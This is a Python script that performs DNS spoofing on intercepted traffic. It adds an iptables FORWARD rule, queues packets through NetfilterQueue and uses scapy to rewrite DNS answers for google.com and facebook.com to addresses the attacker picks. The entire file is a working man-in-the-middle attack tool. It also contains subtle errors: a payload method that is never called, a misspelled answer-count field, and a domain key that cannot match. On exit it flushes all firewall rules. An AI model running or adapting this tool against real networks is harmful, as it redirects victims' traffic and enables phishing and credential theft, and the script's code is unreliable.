#!/usr/bin/python3
import os
from scapy.all import *
from netfilterqueue import NetfilterQueue


# DNS mapping records
dns_hosts = {
    b"www.google.com.": "74.125.24.138",
    b"google.com.": "74.125.24.138",
    b"facebook.com": "157.240.13.35"
}


# Whenever a new packet is redirect to netfilter quine, the callback is called
def process_packet(packet):
    # convert netfilter quine packet to scapy packet
    scapy_packet = IP(packet.get_payload)
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS resource record then modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            pass
        print("[After]: ", scapy_packet.summary())
        # set back as netfilter quine packet
        packet.set_payload(bytes(scapy_packet))
    packet.accept()


"""
Modifies the DNS Resource Record `packet` to map our globally defined `dns_hosts`.
For instance, when we will see google.com then the function replace real ip with our fake ip
"""


def modify_packet(packet):
    # get the DNS name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        print("No modification")
        return packet
    # craft new answer, overriding the original
    # setup the raw data fot the IP we want to redirect (spoof)
    # Ex. google.com will be mapped to "192.168.1.135"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set up the answer count to 1
    packet[DNS].account = 1
    # modified the packet
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


QUEUE_NUM = 0
# insert the iptables FORWARD rule
os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
queue = NetfilterQueue()


try:
    # bind the quine number to our callback `process_packet`
    queue.bind(QUEUE_NUM, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
